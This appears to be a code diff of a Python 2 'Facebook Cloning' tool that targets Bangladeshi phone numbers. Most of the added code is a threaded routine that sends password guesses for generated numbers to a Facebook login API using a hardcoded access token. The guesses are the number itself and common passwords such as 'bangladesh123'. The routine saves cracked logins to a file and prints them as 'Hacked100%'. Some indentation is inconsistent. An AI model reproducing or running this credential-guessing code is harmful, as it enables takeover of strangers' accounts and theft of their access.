@@ -1,6 +1,7 @@
-# Decompile by FARHAN-MUH-TASIM:)
-# with (uncompyle6) version : 3.7.4
-# Time Succes decompile : 2022-09-07 08:13:36.727454
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+#Open Source Code.No Need More Modification.
+#Code by FARHAN
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
 os.system('rm -rf .txt')
 for n in range(7000):
@@ -52,7 +53,8 @@ W='\033[1;97m'
 S='\033[1;96m'
 P='\033[1;95m'
 Y='\033[1;93m'
-logo = """
+logo = ("""\033[0;96m
+
 ███████╗██████╗░███╗░░██╗░░░░░░░██╗░░░░░░░██╗██╗███████╗██╗
 ██╔════╝██╔══██╗████╗░██║░░░░░░░██║░░██╗░░██║██║██╔════╝██║
 █████╗░░██████╔╝██╔██╗██║█████╗░╚██╗████╗██╔╝██║█████╗░░██║
@@ -65,16 +67,14 @@ logo = """
  \033[1;37mGithub  :            gtajisan X me
  \033[1;37mWhatsapp:            +880130505723*
  \033[1;31mTOOL INF: Facebook Cloning 
-
  \033[1;31mFor Help : FB-AND-TELEGRAM
-
  \033[1;31mNote    :       FB Cloning 
 \033[1;36m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;32m
 💕🍃🌹🍃💕
 💕.•°``°•.¸.•°``°•.💕
    (   🍃 🌹 🍃   ) 💕
  💕`•.¸   💗   ¸.•` 💕 
-     💕° •.¸¸.•° 💕   MAFIA-KILLER-FAHAN☕
+     💕° •.¸¸.•° 💕   FARHAN MUH TASIM☕
            💕💕         BE HAPPY 🍃🌻🍃
              💕     💕🍃🌹🍃💕  .💘
                     💕.•°``°•.¸.•°``°•.💕
@@ -83,7 +83,8 @@ logo = """
                           💕° •.¸¸.•° 💕
                                 💕💕
                                   💕         
-"""
+""")
+
 logo2 = """
 \x1b[1;92m➣ NAME :           💗 FARHAN MUH TASIM 💗
 \x1b[1;91m➣ PGE NAME :  💣FARHAN-TECH####/##💣
@@ -132,7 +133,7 @@ def login():
 def menu():
 	os.system('clear')
 	print logo
-	print "\033[1;96m💖━━━━━━━━━💘💘💘(MAFIA-KILLER-FARHAN)💘💘💘━━━━━━━━💖\n" 
+	print "\033[1;96m💖━━━━━━━━━💘💘💘(FARHAN MUH TASIM)💘💘💘━━━━━━━━💖\n" 
 	print '\033[1;97m[1]\033[1;92m GP'
 	print '\033[1;97m[2]\033[1;92m Robi'
 	print '\033[1;97m[3]\033[1;92m Airtel'
@@ -140,7 +141,7 @@ def menu():
 	print '\033[1;97m[5]\033[1;92m Teletalk'
 	print '\033[1;97m[6]\033[1;92m Youtube'
 	print '\033[1;97m[0]\033[1;92m Exit            '
-	print "\033[1;96m💖━━━━━━━━━💘💘💘(MAFIA-KILLER-FARHAN)💘💘💘━━━━━━━━💖\n" 
+	print "\033[1;96m💖━━━━━━━━━💘💘💘(FARHAN MUH TASIM)💘💘💘━━━━━━━━💖\n" 
 	action()
 	
 def action():
@@ -160,4 +161,187 @@ def action():
 				id.append(line.strip())
 		except IOError:
 			print ("[!] File Not Found")
-			raw_input("
+			raw_input("\n[ Back ]")
+			menu()
+	elif ahmad =="2":
+		os.system("clear")
+		print (logo2)
+		print("\033[1;93m180,181, 182, 183, 184, 185, 186, 187, 188, 189")
+		try:
+			c = raw_input("\033[1;96m choose code  : ")
+			k="+880"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			menu()
+	elif ahmad =="3":
+		os.system("clear")
+		print (logo2)
+		print("\033[1;93m160,161, 162, 163, 164, 165, 166, 167, 168, 169")
+		try:
+			c = raw_input("\033[1;96m choose code  : ")
+			k="+880"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			menu()
+	elif ahmad =="4":
+		os.system("clear")
+		print (logo2)
+		print("\033[1;93m190,191, 192, 193, 194, 195, 196, 197, 198, 199,140,141, 142, 143, 144, 145, 146, 147, 148, 149")
+		try:
+			c = raw_input("\033[1;96m choose code  : ")
+			k="+880"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			menu()
+	elif ahmad =="5":
+		os.system("clear")
+		print (logo2)
+		print("\033[1;93m150,151, 152, 153, 154, 155, 156, 157, 158, 159")
+		try:
+			c = raw_input("\033[1;96m choose code  : ")
+			k="+880"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			menu()
+	elif ahmad =="6":		
+		os.system('xdg-open https://youtube.com/@zerox-farhan?si=ePIXHP6rWYWa3KPH')
+		login()
+	elif ahmad =='0':
+		exb()
+	else:
+		print '[!] Fill in correctly'
+		action()
+	xxx = str(len(id))
+	psb ('[✓] Total Numbers: '+xxx)
+	time.sleep(0.5)
+	psb ('\033[1;91m[✓]\033[1;94m Please wait, process is running ...')
+	time.sleep(0.5)
+	psb ('[!] To Stop Process Press CTRL+z')
+	time.sleep(0.5)
+	print "\033[1;96m💖━━━━━━━━━━💘💘💘FARHAN💘💘💘━━━━━━━━━💖\n" 
+	
+	
+			
+	def main(arg):
+		global checkpoint,successfull
+		user = arg
+		try:
+			os.mkdir('save')
+		except OSError:
+			pass
+		try:
+			pass1 = user
+			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+			q = json.load(data)
+			if 'access_token' in q:
+				print '\x1b[1;92m{Hacked100%💉}  ' + k + c + user + '  》  ' + pass1+'\n'+"\n"
+				okb = open('save/successfull.txt', 'a')
+				okb.write(k+c+user+'-•◈•-'+pass1+'\n')
+				okb.close()
+				oks.append(c+user+pass1)
+			else:
+				if 'www.facebook.com' in q['error_msg']:
+					print '\033[1;96m[FARHAN MUH TASIM-Checkpoint] ' + k + c + user + '  》  ' + pass1+'\n'
+					cps = open('save/checkpoint.txt', 'a')
+					cps.write(k+c+user+'-•◈•-'+pass1+'\n')
+					cps.close()
+					cpb.append(c+user+pass1)
+ 				else:
+ 				    pass2="786786"
+ 				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+ 				    q = json.load(data)
+ 				    if 'access_token' in q:
+ 				        print '\x1b[1;92m{Hacked100%💉}  ' + k + c + user + '  》  ' + pass2+'\n'+"\n"
+ 				        okb = open('save/successfull.txt', 'a')
+ 				        okb.write(k+c+user+'-•◈•-'+pass2+'\n')
+ 				        okb.close()
+ 				        oks.append(c+user+pass2)
+ 				    else:
+ 				        if 'www.facebook.com' in q['error_msg']:
+ 					        print '\033[1;96m[Checkpoint] ' + k + c + user + '  》  ' + pass2+'\n'
+ 					        cps = open('save/checkpoint.txt', 'a')
+ 					        cps.write(k+c+user+'-•◈•-'+pass2+'\n')
+ 					        cps.close()
+ 					        cpb.append(c+user+pass2)
+                                        else:
+ 				            pass3="bangladesh123"
+ 				            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+ 				            q = json.load(data)
+ 				            if 'access_token' in q:
+ 				                print '\x1b[1;92m{Hacked100%💉}  ' + k + c + user + '  》  ' + pass3+'\n'+"\n"
+ 				                okb = open('save/successfull.txt', 'a')
+ 				                okb.write(k+c+user+'-•◈•-'+pass3+'\n')
+ 				                okb.close()
+ 				                oks.append(c+user+pass3)
+ 				            else:
+ 				                if 'www.facebook.com' in q['error_msg']:
+ 					                print '\033[1;96m[Checkpoint] ' + k + c + user + '  》  ' + pass3+'\n'
+ 					                cps = open('save/checkpoint.txt', 'a')
+ 					                cps.write(k+c+user+'-•◈•-'+pass3+'\n')
+ 					                cps.close()
+ 					                cpb.append(c+user+pass3)
+                                                else:
+ 				                    pass4="banglades"
+ 				                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+ 				                    q = json.load(data)
+ 				                    if 'access_token' in q:
+ 				                        print '\x1b[1;92m{Hacked100%💉}  ' + k + c + user + '  》  ' + pass4+'\n'+"\n"
+ 				                        okb = open('save/successfull.txt', 'a')
+ 				                        okb.write(k+c+user+'-•◈•-'+pass4+'\n')
+ 				                        okb.close()
+ 				                        oks.append(c+user+pass4)
+ 				                    else:
+ 				                        if 'www.facebook.com' in q['error_msg']:
+ 					                        print '\033[1;96m[Checkpoint] ' + k + c + user + '  》  ' + pass4+'\n'
+ 					                        cps = open('save/checkpoint.txt', 'a')
+ 					                        cps.write(k+c+user+'-•◈•-'+pass4+'\n')
+ 					                        cps.close()
+ 					                        cpb.append(c+user+pass4)
+															
+		except:
+			pass
+		
+	p = ThreadPool(30)
+	p.map(main, id)
+	print "\033[1;96m💖━━━━━━━━━━━━💘💘💘(FARHAN MUH TASIM)💘💘💘━━━━━━━━━━━💖" 
+	print '[✓] Process Has Been Completed ....'
+	print '[✓] Total OK/CP : '+str(len(successfull))+'/'+str(len(checkpoint))
+	print('[✓] CP File Has Been Saved : save/checkpoint.txt')
+	print"""
+(¯`🌹¯)🌷
+`*.🍃.*´. 🌸🍃🌸:*¸. • 
+¸.•´¸.•*¨) ¸🌹•*¨) 🌸 
+🌸(¸.•´🍃(¸.•´ .•´ 🍃¸.🌸
+🔮🌷*.*.¸¸¸¸.*.*.¸¸🌷🔮 　　┊　┊　┊
+🔮🌷LOVE YOU🌷🔮 
+　　┊　┊　┊
+　　┊　┊    🔮   　　　
+　　┊   🔮
+　   🔮
+(¯`🌹¯)🌷
+`*.🍃.*´. 🌸🍃🌸:*¸. • 
+¸.•´¸.•*¨) ¸🌹•*¨) 🌸 
+🌸(¸.•´🍃(¸.•´ .•´ .🌸
+	"""
+	raw_input('\n[Press Enter To Go Back]')
+	os.system('python2 hack.py')
+		
+if __name__ == '__main__':
+	menu()
+# Mau Ngapain Cuk?
